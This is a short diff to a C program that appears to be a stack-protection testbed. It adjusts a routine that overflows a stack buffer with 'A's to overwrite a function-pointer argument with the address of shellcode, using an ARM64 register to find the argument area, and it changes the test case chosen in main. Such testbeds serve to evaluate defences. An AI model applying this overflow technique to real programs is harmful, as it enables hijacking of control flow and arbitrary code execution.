@@ -59,11 +59,14 @@ void parameter_func_pointer(int choice, void (*stack_function_pointer)()) {
   /* Just a dummy pointer setup */
   stack_pointer = &stack_buffer[1];
 
+  /* Store in i the address of the stack frame section dedicated to function arguments */
+  register int i asm("x8");
+
   if ((choice == -4) &&
-      ((long)&choice > (long)&propolice_dummy)) {
+      ((long)i > (long)&propolice_dummy)) {
     /* First set up overflow_buffer with 'A's and a
        new function pointer pointing to the shellcode */
-    overflow = (int)((long)&stack_function_pointer - (long)&stack_buffer);
+    overflow = (int)((long)(i+28) - (long)&stack_buffer);
     memset(overflow_buffer, 'A', overflow);
     overflow_buffer[overflow/4] = (long)&shellcode;
 
@@ -379,7 +382,7 @@ int main (int argc, char **argv) {
   
   base_pointer_offset = 4;
 
-  choice = 13;
+  choice = -2;
 
   switch(choice) {
   case -4:
